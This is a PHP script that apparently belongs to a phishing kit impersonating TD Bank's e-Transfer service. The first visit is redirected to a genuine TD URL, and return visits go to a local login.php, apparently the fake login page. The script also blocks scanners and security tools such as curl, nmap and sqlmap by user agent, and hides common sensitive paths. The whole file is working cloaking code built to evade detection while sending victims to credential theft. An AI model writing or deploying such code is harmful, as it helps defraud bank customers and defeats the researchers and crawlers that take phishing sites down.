<?php
declare(strict_types=1);

session_start();

/* ---------------- GET UNIQUE PAGE KEY ---------------- */
$pageKey = $_GET['pageKey'] ?? 'default';
$pageKey = preg_replace('/[^A-Za-z0-9_]/', '', $pageKey);

/* ---------------- CONFIG ---------------- */
$first_visit_url = 'https://www.feeds.td.com/en/mmt/?RMID=CA1MmbHgPq3&';
$return_url      = 'login.php';
$expiry_seconds  = 86400 * 30; // 30 days

/* ---------------- COOKIE NAME ---------------- */
$cookie_name = "etransfer_first_seen_td_" . $pageKey;

/* ---------------- VALIDATE URL ---------------- */
if (empty($first_visit_url) || !filter_var($first_visit_url, FILTER_VALIDATE_URL)) {
    header("Location: $return_url", true, 302);
    exit;
}

/* ---------------- CACHE CONTROL — NO BACK/FORWARD ---------------- */
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');

/* ---------------- FORCE HTTPS ---------------- */
$isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ||
           (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &&
            $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');
if (!$isHttps) {
    header("Location: https://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}", true, 301);
    exit;
}

/* ---------------- ANTI-SCANNER / BOT BLOCKING ---------------- */
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$blockedAgents = ['curl','wget','python','java','go-http','httpclient','nmap','nikto','sqlmap','dirbuster','scanner','fuzzer','spider','bot'];
foreach ($blockedAgents as $b) {
    if (strpos($ua, $b) !== false) {
        http_response_code(403);
        exit;
    }
}

/* ---------------- BLOCK COMMON SENSITIVE PATHS ---------------- */
$uri = strtolower($_SERVER['REQUEST_URI'] ?? '');
$blockedPaths = ['.env','.git','wp-admin','wp-login','phpinfo','backup','dump','sql','config'];
foreach ($blockedPaths as $p) {
    if (strpos($uri, $p) !== false) {
        http_response_code(404);
        exit;
    }
}

/* ---------------- FIRST VISIT ---------------- */
if (!isset($_COOKIE[$cookie_name])) {
    setcookie(
        $cookie_name,
        hash('sha256', $_SERVER['HTTP_USER_AGENT'] . ($_SERVER['REMOTE_ADDR'] ?? '')),
        time() + $expiry_seconds,
        '/',
        '',
        isset($_SERVER['HTTPS']),
        true
    );

    header("Location: $first_visit_url", true, 302);
    exit;
}

/* ---------------- SECOND VISIT → GO TO LOGIN.PHP ---------------- */
header("Location: $return_url", true, 302);
exit;
